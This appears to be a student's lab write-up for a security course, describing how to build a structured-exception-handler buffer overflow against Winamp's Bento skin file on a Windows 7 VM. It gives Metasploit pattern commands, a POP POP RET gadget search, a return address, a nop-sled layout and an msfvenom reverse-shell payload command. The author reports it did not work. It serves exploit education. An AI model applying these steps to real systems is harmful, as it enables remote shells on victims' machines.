Programming Assignment 4
Dacey Wieland
1. First to even get a buffer overflow we need to setup the process. So open winamp on the windows 7 machine, and once open change the skin to something other than Bento. 
2. Then navigate to where the maki file is at, mine is located at C:\ProgramFiles\Winamp\Skins\Bento\scripts, and rename the file to something else so it doesn't get overwritten.
That should have us setup for the next steps
To generate a buffer overflow:
3. Using the file given on Canvas, edit the Hello World to a very long string to generate the overflow.
4. To create the long string, go to the Kali Linux VM, navigate to /usr/share/metasploit_frameworks/tools/exploit, and run the command msf_pattern_create -l 20000. This should generate a long string to be put in that file. The full overflow file just for buffer overflows will be included called overflow1.pl
5. Next using what we did above open windbg and click attach to process and attach to the most recent winamp.exe process, and make sure to type g otherwise it will freeze winamp
6. Next switch the overflow file into where the original maki file is located and run the command overflow1.pl > mcvcore.maki
7. on winamp switch the skin back to Bento and you should see that we have an overflow.
Gathering Locations
8. On windbg if you type g again you should get the value of your EIP, mine was 0x376d5636
9. Take this value to Kali Linux and in the same location as before, run the command: msf-pattern_offset -l 20000 -q 376d5636, this should find an exact match at offset 16760 so that is the size of the buffer.
10. Then next we need to find the address to an instance of POP POP RET, or POP EDI POP ESI RET as it says in the assignment file.
11. In order to know what x86 code to look for, I used https://defuse.ca/online-x86-assembler.htm#dissambly that I got from Grace Mcleod a student in this class. After putting in POP POP RET, it returned the instructions as: 5F 5E C3
12. Next we need to find libraries of winamp that aren't protected so we can redirect the program there later. In windbg I loaded Narly using !narly, and then !nmod.
13. To find an instance, I just used NSCRT library from 7c340000 to 7c396000. To search I used s 0xFirstValue L? 0xSecondValue 5F 5E C3. I got a lot of instances, and a screenshot of what it looks like is included. I chose an address without any weird characters or nulls.
14. The last thing we need is the shell code: I used the same command as we have done in previous assignments. Here is the command I ran msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=876 -e x86/alpha_mixed -f perl. 
Exploit Time
15. alright let's craft the exploit, we need to put together all of the variables into the function_name variable. So first we need to add a nop sled. We know the buffer size is 16760. 
17. But we also want to use jmp 4, as outlined in the slide given to jump over the eip. So we need to subtract four bytes from the total of the nop sled and add nop nop jmp 4 to the end.
 18. Using the previous assignments, we know that looks like \x90\x90\xEB\x04. Then we can replace the eid with the address of POP POP RET that we found. Because this is in little endian architecture, we put in the address backward like: \xfd\x1d\x34\x7c
19. Lastly, we add the shell code generated by the command above. The full file is found in overflow2.pl
TO run the exploit, follow the steps as we did beforehand to generate the buffer overflow. I could not get this working.
